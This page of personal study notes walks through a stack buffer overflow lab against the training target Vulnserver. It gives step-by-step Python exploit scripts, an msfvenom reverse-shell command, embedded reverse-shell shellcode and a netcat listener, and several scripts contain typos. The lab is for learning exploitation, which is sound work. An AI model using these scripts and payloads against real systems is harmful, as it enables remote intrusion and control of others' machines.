<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Notes</title>
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1>Buffer overflows made easy 2022</h1></strong><br /><br />********************************************************************************************************************************<br /><strong><h3>Materials for learning </h3></strong><br /><br /><h3>~Target Machine~</h3><br />Install Immunity Debugger on Windows 10 computer  <br />Remove firewall and Defender from being active <br />Install Vulnserver for exploit - This also will install python 2 <br />Run all updates and Debloat the machine using Chris Titus debloat script<br /><br /><br /><br /><h3>~Attacker Machine~</h3><br />Attacker Machine is Updated Kali Linux install<br /><br />********************************************************************************************************************************<br /><br /><br />********************************************************************************************************************************<br /><h3>#Theory </h3><br />Using a combination of tactics we can overflow the memory and have an exe execute shell code.<br /><br /> <a href=""><img src="images/2-1.png" alt="images/2-1.png" /></a><br /> <br /> This is the layout of memory in a running computer. We are going to concentrate our attack on the stack<br /> <br /> <br /> <br /> <br /><h3> Here is the layout of the stack </h3><br /> <a href=""><img src="images/2-2.png" alt="images/2-2.png" /></a><br /> <br /><br /><br /><br /><h3> Normal Buffer usage in the stack looks like this </h3><br /> <a href=""><img src="images/2-3.png" alt="images/2-3.png" /></a><br /> The characters are stored in the buffer and cleaned out before EBP - This is normal usage<br /><br /><br /><br /><br /><h3> This is what an attack on the buffer looks like </h3><br /> <a href=""><img src="images/2-4.png" alt="images/2-4.png" /></a><br /> As you can see the characters are written into memory. They over write the EBP and right into the EIP. <br /> <br /> The EIP is the real target. Once you control this address in memory your can tell the exe to execute what ever code payload you have as long as you have room in memory for it.<br /> ********************************************************************************************************************************<br /> <br /> <br /> <br /><br />********************************************************************************************************************************<br /><h3> </h3><strong><h3>Steps for a buffer overflow</h3></strong><br /> 1. Spiking<br /> 2. Fuzzing<br /> 3. Finding the offset<br /> 4. Overwriting the EIP<br /> 5. Finding Bad Characters<br /> 6. Finding the Right Module<br /> 7. Generating Shell Code<br /> 8. Gain root access !BLING BLING!<br />********************************************************************************************************************************<br /><br /><br /><br /><br /><br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><strong><h3>1.  </h3></strong><strong><h3>Spiking</h3></strong><br /><br />Start up vulnserver and Immunity Debugger as Administator<br />Attach to the vulnserver<br /><br />Get the IP and vulnserver runs on 9999<br /><br />On Kali<br />nc -nv [targetIP] 9999<br /><br />Once connected, type HELP for list of valid commands<br />Make note of the commands available to us<br />We will investigate what command(s) is/are vulnerable to buffer over flow attack<br /><br />Type EXIT to terminate the connection to vulnserver<br /><br />We will use a command called generic_send_tcp<br />usage: generic_send_tcp [targetIP] [port] spike.script.spk 0 0<br />For each command we are going too make a script that reads like<br /><br />$_readline();<br />$_string(&quot;VULNERABLE_COMMAND_GOES_HERE &quot;);<br />$_string_variable(&quot;0&quot;);<br /><br />Save this in the name of the command in question with a .spk extention<br /><br />This command will send connection attempts to vulnserver and attempt to send a payload of random size and characters to force a crash in the program while we watch in the Debugger. The connections will happen over and over again. This will go for a long time unless you stop the program from sending data(let it complete). If there is no crash that means the command is safe. <br /><br />If the program crashes it&#39;s vulnerable to attack. You will see “Access violation when executing ...” in the information bar at the bottom of the debugger. It will also be flashing.<br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><br /><br /><br /><br /><br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><strong><h3>2. </h3></strong><strong><h3>Fuzzing</h3></strong><br /><br />Restart the debugger and the vulnserver again as administrator and attach debugger to the server <br />Anytime we crash the server we need to restart it using that formula<br /><br />Python code for fuzzing <br /><br />Create the following script in Kali to run against target call it - 1.py<br /><br />######################################################<br />#!/usr/bin/python3<br /><br />import sys, socket<br />from time import sleep<br /><br /><br />buffer = “A” * 100<br /><br />while True:<br />				try:<br />							s=socket.socket(sockket.AF_INET, socket.SOCK_STREAM)<br />							s.connect((&#39;target_IP&#39;,9999))<br />							<br />							payload = “TRUN /.:/&quot; + buffer<br />							<br />							s.send((payload.encode()))<br />							s.close()<br />							sleep(1)<br />							buffer = buffer + ‘A’ * 100<br />				except: <br />							print (“Fuzzing crashed at %s bytes” % str(len(buffer)))<br />							sys.exit()<br /><br />######################################################<br /><br />This code will cycle over. Each time it cycles it will send an additional 100 bytes of data containing (&quot;A&#39;s&quot;).<br />When the program crashes we will look at how many bytes it took too do this. Once crashed we CTRL+C the program in Kali <br />For the TRUN command it took around 3000 bytes<br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><br /><br /><br /><br /><br /><br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><strong><h3>3. </h3></strong><strong><h3>Finding the Offset</h3></strong><br /><br />We need to create a pattern list of characters 3000 bytes long<br />To do this we run<br /><br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000<br />Copy the result from the command<br /><br /><br />2.py<br />######################################################<br />#!/usr/bin/python3<br /><br />import sys, socket<br /><br /><br />offset = ‘<span style="color:#ed333b;">#####YOUR_PASTED_PATTERN_YOU_CREATED_GOES_HERE#####</span>’<br /><br />#We no longer need a loop because we are sending the payload once. Note the code changes<br />try:<br />			s=socket.socket(sockket.AF_INET,socket.SOCK_STREAM)<br />			s.connect((&#39;target_IP&#39;,9999))<br />			#---the command plus our new payload in the offset variable---#			<br />			payload = “TRUN /.:/&quot; + offset<br />							<br />			s.send((payload.encode()))<br />			s.close()<br />except: <br />			print (“Error connecting to server”)<br />			sys.exit()<br /><br />######################################################<br /><br />After this crash of the server you want to note the EIP value. In this case its 386F4337<br /><br />Next we run this command to find the offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337<br />This will return<br />[*] Exact match at offset 2003<br /><br />This tells us at 2003 bytes we can control the EIP. Remember the EIP is where we can redirect to execute our payload<br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><br /><br /><br /><br /><br /><br /><br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><strong><h3>4. </h3></strong><strong><h3>Overwriting the EIP</h3></strong><br /><br />Remember to restart the server and debugger<br /><br />Now we know that at 2003 bytes of characters we can tell the EIP where our code is but first we need too....<br /><br />3.py<br />######################################################<br />#!/usr/bin/python3<br /><br />import sys, socket<br /><br /><br />shellcode = “A” * 2003 + “B” * 4<br /><br />#-Note the code changes<br />try:<br />			s=socket.socket(sockket.AF_INET,socket.SOCK_STREAM)<br />			s.connect((&#39;target_IP&#39;,9999))<br />			#---the command plus our new payload in shellcode variable---#			<br />			payload = “TRUN /.:/&quot; + shellcode<br />							<br />			s.send((payload.encode()))<br />			s.close()<br />except: <br />			print (“Error connecting to server”)<br />			sys.exit()<br /><br />######################################################<br /><br />What will happen is 41414141(the “A&#39;s”) will be written on everything except the EIP which should have 42424242(the “B&#39;s”)<br /><br />This means we have written over the EIP and now can control what gets executed by the vulnserver. We can slip code in that will do what ever we like(payload).<br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><br /><br /><br /><br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><strong><h3>5. </h3></strong><strong><h3>Finding Bad Characters</h3></strong><br /><br />We want to avoid certain characters because they are “bad”. We do this because one of these hex characters could be a command in the program that tells the program what too do. When running our code we don&#39;t want to mistakenly call a function from the program and screw up our code we are executing from a buffer. So we need to find them.<br /><br />When we are finding bad characters this means we are looking for what hexidecimal character(s) is/are bad when we generate shell code. <br />We do this by sending all the hex characters into the target to see what ones do not work well with the target. <br /><br /><br /><br />By default NULLBYTE character is no good ---- \x00 ← never send this guy!<br /><br />From the github repo of https://github.com/cytopia/badchars<br />There is a program we can install on Kali but the repo gives us what we are looking for. I have copied and pasted it below.<br /><br />$ badchars -f python<br />badchars = (<br />  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;<br />  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;<br />  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;<br />  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;<br />  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;<br />  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;<br />  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;<br />  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;<br />  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;<br />  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;<br />  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;<br />  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;<br />  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;<br />  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;<br />  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;<br />  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;<br />)<br /><br /><br />4.py<br />######################################################<br />#!/usr/bin/python3<br /><br />import sys, socket<br /><br />badchars = (<br />  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;<br />  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;<br />  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;<br />  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;<br />  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;<br />  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;<br />  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;<br />  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;<br />  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;<br />  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;<br />  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;<br />  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;<br />  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;<br />  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;<br />  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;<br />  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;<br />)<br /><br />shellcode = “A” * 2003 + “B” * 4 + badchars<br /><br /><br />try:<br />			s=socket.socket(sockket.AF_INET,socket.SOCK_STREAM)<br />			s.connect((&#39;target_IP&#39;,9999))<br />			#---the command plus our new payload in shellcode variable---#			<br />			payload = “TRUN /.:/&quot; + shellcode<br />							<br />			s.send((payload.encode()))<br />			s.close()<br />except: <br />			print (Error connecting to server)<br />			sys.exit()<br /><br />######################################################<br />Run this script<br /><br />At ESP right click and follow in dump<br /><a href=""><img src="images/2-5.png" alt="images/2-5.png" /></a><br /><br />As you can see by the hilghts B0 the place holder of the bad characters. Every spot you see B0 that hex value that should be there is a bad character you need to avoid when writing your payload. Not all programs are the same. B0 shows up here but may not be what shows up in another program when looking for bad chars.<br /><br />example first line has B0 for 04 and 05 -→ so 04 and 05 are bad characters<br />→ \x04 and \x05<br /><br />You need to inspect this dump from 01 to FF<br />  <br />On the vulnserver it has no bad chars so we will not be setting any bad chars when we generate our shell code<br /><br /><span style="color:#ed333b;">******</span><em><h3>Alternatively we can do this in the debugger</h3></em><br /><br />Setup working folder for mona<br />Create a folder on C:\mona (working directory)<br /><br />Enter in the debugger at the input on the bottom of the CPU view<br />!mona config -set workingfolder c:\mona<br /><br />Next we can setup a byte array using mona<br />!mona bytearray -cpb “\x00”<br />This setups a bad charcters list and you can view in C:\mona\bytearray.txt<br /><br />Also creates a bytearray.bin file we can use later<br /><br />Run your badcharcters script in the attacking computer<br />4.py<br /><br />Instead of right clicking on the ESP and following in DUMP and manual code review, now we can automate...<br />Using mona<br /><br />We call the mona script and use the bytearray.bin and compare the differences to address in ESP <br />!mona compare -f c:\mona\bytearray.bin -a 010AF9C8<br />&lt;Enter&gt;<br /><br />A window should popup with the list of bad characters automatically<br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><br /><br /><br /><br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><strong><h3>6. </h3></strong><strong><h3>Finding the Right Module</h3></strong><br /><br />So we are looking for a program or DLL with no memory protections<br />We will use a tool that does not come with the debugger called mona.py<br /><a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a><br /><br />Install the mona.py into C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands<br /><br />In the command prompt on the debugger type the following command<br />!mona modules &lt;Enter&gt;<br /><br />A window listing all the programs that run with the vulnserver.exe(target_program.exe) should popup<br />What you are looking for is in the True/False columns - | Rebase | SafeSEH | ASLR | NXCompat | OS DLL |<br /><br />We want a program running with our target program → In this case essfunc.dll<br />Also we want all the protections listed above to be False. <br /><br /><em><span style="color:#ed333b;">****There is a better way... check bottom of the section</span></em><br /><br />~The JMP code to ESP<br />Now we need to find the OPTCODE equivlant of a JMP command<br />We do this by using nasm_shell<br /><br />/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb<br />run this in your cli on Kali<br /><br />You will see a nasm interface<br />nasm &gt;<br /><br />Enter the following<br />JMP ESP &lt;Enter&gt;<br /><br />We should get back<br />00000000 FFE4			jmp esp<br />nasm &gt;<br /><br /><br />Now we take this code FFE4 and go into the debugger<br /><br /><br />At the bottom in the input field we enter <br />!mona find -s “\xff\xe4” -m essfunc.dll<br />remember we enter the search string as hex values <br /><br />We are looking for a return addresses → 0x625011af this one looks good to use(we can try them all)<br />So we make note of it and we will use it in our exploit<br /><br /><br />Please note we have changed the EIP from all “B&#39;s” to our new return address we found.<br />This is where we point to our exploit code because this return address is vulnerable<br />5.py<br />######################################################<br />#!/usr/bin/python3<br /><br />import sys, socket<br /><br />#return address 625011af = \xaf\x11\x50\x62 → its reversed for input into memory<br /><br /><br />shellcode = “A” * 2003 + “\xaf\x11\x50\x62”<br /><br /><br />try:<br />			s=socket.socket(sockket.AF_INET,socket.SOCK_STREAM)<br />			s.connect((&#39;target_IP&#39;,9999))<br />			#---the command plus our new payload in shellcode variable---#			<br />			payload = “TRUN /.:/&quot; + shellcode<br />							<br />			s.send((payload.encode()))<br />			s.close()<br />except: <br />			print (Error connecting to server)<br />			sys.exit()<br /><br />######################################################<br /><br /><br /> Next in the debugger open the CPU view and  we are going to follow an expression using the black right arrow icon in the tool bar at the top<br /> Hit F2 and enter the return address. In this case it will be 625011af - this sets a breakpoint -aka pauses the program<br /><br />Run 5.py so we can see it in the debugger<br /><br />You can now see we control the EIP with a JMP instruction to essfunc.625011af <br /><br /><span style="color:#ed333b;">******</span><em><h3>Alternatively we can do this in the debugger</h3></em><br />At the bottom of the debugger in the input field <br />!mona jmp -r ESP -m “essfunc.dll”<br />This should give us the JMP ESP return address <br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><br /><br /><br /><br /><br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><strong><h3>7.</h3></strong><h3> </h3><strong><h3>Generation of Shell Code and Getting shell</h3></strong><br /><br />msfvenom -p windows/shell_reverse_tcp LHOST=[YOUR_IP] LPORT=4444 EXITFUNC=thread -f c -a x86 -b “\x00”<br /><br />-p means payload of Windows reverse shell<br />LHOST attackers computer<br />LPORT is the port you want the reverse shell to come to your attackers computer<br />EXITFUNC stablizes the code<br />-f means its going to export code in C<br />-a specifies the artechture of x86 vs x64 <br />-b are the bad characters we looked for previously<br /><br />Run the command <br /><br />copy the hexcode and note the payload size just to be sure we will not run out of room for the payload<br />This should be fine <br /><br /><br /><br />6.py<br />######################################################<br />#!/usr/bin/python3<br /><br />import sys, socket<br /><br />overflow = ( &quot;\xdb\xc7\xba\x83\xd6\xbc\xa0\xd9\x74\x24\xf4\x58\x31\xc9\xb1&quot;<br />&quot;\x52\x31\x50\x17\x83\xc0\x04\x03\xd3\xc5\x5e\x55\x2f\x01\x1c&quot;<br />&quot;\x96\xcf\xd2\x41\x1e\x2a\xe3\x41\x44\x3f\x54\x72\x0e\x6d\x59&quot;<br />&quot;\xf9\x42\x85\xea\x8f\x4a\xaa\x5b\x25\xad\x85\x5c\x16\x8d\x84&quot;<br />&quot;\xde\x65\xc2\x66\xde\xa5\x17\x67\x27\xdb\xda\x35\xf0\x97\x49&quot;<br />&quot;\xa9\x75\xed\x51\x42\xc5\xe3\xd1\xb7\x9e\x02\xf3\x66\x94\x5c&quot;<br />&quot;\xd3\x89\x79\xd5\x5a\x91\x9e\xd0\x15\x2a\x54\xae\xa7\xfa\xa4&quot;<br />&quot;\x4f\x0b\xc3\x08\xa2\x55\x04\xae\x5d\x20\x7c\xcc\xe0\x33\xbb&quot;<br />&quot;\xae\x3e\xb1\x5f\x08\xb4\x61\xbb\xa8\x19\xf7\x48\xa6\xd6\x73&quot;<br />&quot;\x16\xab\xe9\x50\x2d\xd7\x62\x57\xe1\x51\x30\x7c\x25\x39\xe2&quot;<br />&quot;\x1d\x7c\xe7\x45\x21\x9e\x48\x39\x87\xd5\x65\x2e\xba\xb4\xe1&quot;<br />&quot;\x83\xf7\x46\xf2\x8b\x80\x35\xc0\x14\x3b\xd1\x68\xdc\xe5\x26&quot;<br />&quot;\x8e\xf7\x52\xb8\x71\xf8\xa2\x91\xb5\xac\xf2\x89\x1c\xcd\x98&quot;<br />&quot;\x49\xa0\x18\x0e\x19\x0e\xf3\xef\xc9\xee\xa3\x87\x03\xe1\x9c&quot;<br />&quot;\xb8\x2c\x2b\xb5\x53\xd7\xbc\x7a\x0b\xd7\x58\x13\x4e\xd7\xb1&quot;<br />&quot;\xbf\xc7\x31\xdb\x2f\x8e\xea\x74\xc9\x8b\x60\xe4\x16\x06\x0d&quot;<br />&quot;\x26\x9c\xa5\xf2\xe9\x55\xc3\xe0\x9e\x95\x9e\x5a\x08\xa9\x34&quot;<br />&quot;\xf2\xd6\x38\xd3\x02\x90\x20\x4c\x55\xf5\x97\x85\x33\xeb\x8e&quot;<br />&quot;\x3f\x21\xf6\x57\x07\xe1\x2d\xa4\x86\xe8\xa0\x90\xac\xfa\x7c&quot;<br />&quot;\x18\xe9\xae\xd0\x4f\xa7\x18\x97\x39\x09\xf2\x41\x95\xc3\x92&quot;<br />&quot;\x14\xd5\xd3\xe4\x18\x30\xa2\x08\xa8\xed\xf3\x37\x05\x7a\xf4&quot;<br />&quot;\x40\x7b\x1a\xfb\x9b\x3f\x3a\x1e\x09\x4a\xd3\x87\xd8\xf7\xbe&quot;<br />&quot;\x37\x37\x3b\xc7\xbb\xbd\xc4\x3c\xa3\xb4\xc1\x79\x63\x25\xb8&quot;<br />&quot;\x12\x06\x49\x6f\x12\x03&quot;)<br /><br />#So now we have everything we need <br /># The offset<br />#The EIP with JMP instructions to overflow<br />#We have a rev shell in c hex<br />#Now we need to pad the pay load with NOP PAD(no operations) helps execute the payload<br />#Note the “\x90” * 32 before the payload<br /><br />shellcode = “A” * 2003 + “\xaf\x11\x50\x62” + “\x90” * 32 + overflow<br /><br /><br />try:<br />			s=socket.socket(sockket.AF_INET,socket.SOCK_STREAM)<br />			s.connect((&#39;target_IP&#39;,9999))<br />			#---the command plus our new payload in shellcode variable---#			<br />			payload = “TRUN /.:/&quot; + shellcode<br />							<br />			s.send((payload.encode()))<br />			s.close()<br />except: <br />			print (Error connecting to server)<br />			sys.exit()<br /><br />######################################################<br /><br />Setup a listener on your attacking machine<br /><br />netcat running on 4444 just like the rev shell payload<br />nc -nvlp 4444<br /><br />Run 6.py and we should have reverse shell on the computer with privileges running as user that started the program<br /><br />#!BLING-BLING!<br /><br />********************************************************************************************************************************<br />********************************************************************************************************************************<br /><br />- Credits: <br />- Buffer Overflows Made Easy 2022 - <a href="https://youtu.be/ncBblM920jw">https://youtu.be/ncBblM920jw</a> - The Cyber Mentor<br />- Also S1REN of Offensive Security <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /> <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />  <br /> </div>
</body>
</html>
